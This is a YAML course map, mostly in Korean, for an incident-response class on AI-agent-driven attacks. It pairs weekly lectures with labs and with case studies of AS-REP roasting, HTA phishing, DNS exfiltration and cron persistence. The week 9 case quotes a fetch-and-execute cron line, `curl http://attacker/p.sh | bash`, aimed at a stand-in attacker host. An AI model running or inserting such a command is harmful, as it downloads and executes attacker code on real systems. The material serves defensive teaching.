course_id: agent-ir-adv
notes: |
  agent-ir-adv lecture/lab 완전 정렬 (course20 — 15가지 다른 사례).
  Precinct 6 anchor 들이 *바로 이 과목의 사례 중 일부* — Multi-stage 피싱(w7),
  Fileless(w9), DNS Exfil(w10), AD Kerberoasting(w3) 등.

mappings:
  - week: 1
    lecture: {course: course20-agent-ir-advanced, title: "공급망 Dependency Confusion"}
    labs:
      - {course: agent-ir-adv, week: 1, version: nonai, role: primary, note: "Dependency Confusion IR"}
      - {course: agent-ir-adv, week: 1, version: ai, role: primary}
  - week: 2
    lecture: {course: course20-agent-ir-advanced, title: "Indirect Prompt Injection"}
    labs:
      - {course: agent-ir-adv, week: 2, version: nonai, role: primary, note: "Indirect Injection IR"}
      - {course: ai-safety, week: 2, version: nonai, role: bonus, note: "프롬프트 인젝션 방어 (cross)"}
  - week: 3
    lecture: {course: course20-agent-ir-advanced, title: "AD Kerberoasting 자동화"}
    labs:
      - {course: agent-ir-adv, week: 3, version: nonai, role: primary, note: "AD Kerberoasting IR"}
      - {course: attack-adv, week: 5, version: nonai, role: bonus, note: "Kerberoasting 공격 (cross)"}
    case_study:
      title: "AS-REP roasting 자동화 — 사람 시간 → 분"
      narrative: |
        2024-08-15 11:02~11:18 (16분간) win-dc01 PreAuthFlag=False 계정 3건 식별 +
        AS-REP 응답 198.51.100.42 유출. 사람 공격자라면 BloodHound→GetNPUsers
        →hashcat 으로 *수 시간*. 에이전트면 Tool-use 루프로 *분 단위* 가능.
        본 incident 16분 → 자동화 사례에 가까움.
      mitre: ["T1558.004"]
      anchor_id: anc-7c9fb0248f47
      relevance: "AD Kerberoasting 자동화의 *real timing*. 학생이 동일 incident 의
                 6단계 IR 을 자동·반자동 비교 학습."
      source: "Precinct 6 incident-2024-08-002"
  - week: 4
    lecture: {course: course20-agent-ir-advanced, title: "Cloud IAM 자동 Pivot"}
    labs:
      - {course: agent-ir-adv, week: 4, version: nonai, role: primary, note: "Cloud IAM Pivot IR"}
      - {course: cloud-container, week: 6, version: nonai, role: bonus, note: "IAM 접근 제어 (cross)"}
  - week: 5
    lecture: {course: course20-agent-ir-advanced, title: "0-day 웹 프레임워크 자동 악용"}
    labs:
      - {course: agent-ir-adv, week: 5, version: nonai, role: primary, note: "0-day 웹 자동 악용 IR"}
  - week: 6
    lecture: {course: course20-agent-ir-advanced, title: "N-day 대규모 악용 — Log4Shell"}
    labs:
      - {course: agent-ir-adv, week: 6, version: nonai, role: primary, note: "Log4Shell 계열 IR"}
  - week: 7
    lecture: {course: course20-agent-ir-advanced, title: "Multi-stage 피싱→웹셸→측면이동"}
    labs:
      - {course: agent-ir-adv, week: 7, version: nonai, role: primary, note: "피싱→웹셸→Pivot IR"}
    case_study:
      title: "스피어 피싱 → mshta → PowerShell — Initial Access 표준 chain"
      narrative: |
        2024-08-18: invoice.hta 첨부 실행 → mshta.exe 호출 → cmd → powershell -enc.
        본 사례는 *이메일* 경로지만 동일 메커니즘이 *웹셸 업로드 후 실행*에도 적용.
        Human(피싱 설계)+Agent(이후 자동화) 하이브리드 공격의 첫 단계.
      mitre: ["T1566.001", "T1059.001", "T1218.005"]
      anchor_id: anc-cbdabf2e6c87
      relevance: "Multi-stage 강의의 *첫 단계 실측*. Initial Access 후 에이전트가 분 단위로 진행."
      source: "Precinct 6 incident-2024-08-004"
  - week: 8
    lecture: {course: course20-agent-ir-advanced, title: "컨테이너·K8s 탈출 + API"}
    labs:
      - {course: agent-ir-adv, week: 8, version: nonai, role: primary, note: "K8s Pod Escape IR"}
      - {course: cloud-container, week: 5, version: nonai, role: bonus, note: "K8s 보안 (cross)"}
  - week: 9
    lecture: {course: course20-agent-ir-advanced, title: "Fileless·Memory-only"}
    labs:
      - {course: agent-ir-adv, week: 9, version: nonai, role: primary, note: "Fileless 악성코드 IR"}
    case_study:
      title: "cron + curl downloader — fileless persistence 진화형"
      narrative: |
        2024-08-25 침해 호스트 cron 5분 주기 `curl http://attacker/p.sh | bash`.
        cron entry 만 디스크에 있고 페이로드는 매 실행 메모리에만. 디스크 IOC 부재
        → 전통 AV·EDR signature 우회. Falco 의 "Outbound from container/cron" +
        Volatility3 메모리 dump 가 주요 detection 방법.
      mitre: ["T1053.003", "T1105"]
      anchor_id: anc-bf23b0106fe4
      relevance: "Fileless 강의의 *진짜 fileless 변형*. cron 같은 일상 도구가 fileless 로 활용되는 사례."
      source: "Precinct 6 incident-2024-08-005"
  - week: 10
    lecture: {course: course20-agent-ir-advanced, title: "DNS Exfiltration + AI 인코딩"}
    labs:
      - {course: agent-ir-adv, week: 10, version: nonai, role: primary, note: "DNS Exfil + AI 인코딩 IR"}
    case_study:
      title: "DNS 터널링 base32 — 1,247건 / 2시간 25분"
      narrative: |
        2024-08-22 22:47 ~ 25:12, 10.20.30.80 → ns.evil.example, base32 인코딩
        subdomain 1,247 쿼리. 평균 8.5건/분, 안정적 분산. AI 인코딩은 base32 만
        쓰지 않을 것 — 다양한 인코딩(base64/zlib/custom) 변형 가능. 본 사례는
        *기본형 baseline*.
      mitre: ["T1071.004", "T1048.003"]
      anchor_id: anc-3564198ef1bc
      relevance: "DNS Exfil + AI 인코딩 강의의 *baseline 사례*. 학생이 base32 → 다른 인코딩 변형 시 탐지 룰 진화."
      source: "Precinct 6 incident-2024-08-003"
  - week: 11
    lecture: {course: course20-agent-ir-advanced, title: "AI 모델 자체 공격"}
    labs:
      - {course: agent-ir-adv, week: 11, version: nonai, role: primary, note: "AI 모델 공격 IR"}
      - {course: ai-safety-adv, week: 6, version: nonai, role: bonus, note: "차분 프라이버시 (cross)"}
  - week: 12
    lecture: {course: course20-agent-ir-advanced, title: "Deepfake Voice + AI 사회공학"}
    labs:
      - {course: agent-ir-adv, week: 12, version: nonai, role: primary, note: "Deepfake Voice IR"}
  - week: 13
    lecture: {course: course20-agent-ir-advanced, title: "Insider + Agent Weaponization"}
    labs:
      - {course: agent-ir-adv, week: 13, version: nonai, role: primary, note: "Insider + Agent IR"}
  - week: 14
    lecture: {course: course20-agent-ir-advanced, title: "CI/CD 공급망 오염"}
    labs:
      - {course: agent-ir-adv, week: 14, version: nonai, role: primary, note: "CI/CD 공급망 IR"}
  - week: 15
    lecture: {course: course20-agent-ir-advanced, title: "장기 APT 잠복"}
    labs:
      - {course: agent-ir-adv, week: 15, version: nonai, role: primary, note: "장기 APT + 회고"}
      - {course: agent-ir-adv, week: 15, version: ai, role: primary}
    case_study:
      title: "5건 chain — 장기 APT 잠복의 표본 (7~13일)"
      narrative: |
        2024-08-12 SMB 측면이동 → 08-15 AS-REP roast → 08-18 HTA 피싱 →
        08-22 DNS exfil → 08-25 cron persist. 13일에 걸쳐 *템포 조절*: 매 3~4일
        간격으로 한 단계씩. 단일 사건은 sub-critical, 누적이 critical 캠페인.
        장기 잠복의 표본 — 학생이 13일 timeline 그래프 작성 + alert 우선순위
        재정렬 실습.
      mitre: ["T1566.001", "T1558.004", "T1021.002", "T1053.003", "T1071.004"]
      anchor_id: anc-eca1db9a5a31
      relevance: "장기 APT 강의의 *완전한 timeline 사례*. 본 과정 전체의 회고 자료로 활용."
      source: "Precinct 6 incident-2024-08-001~005"
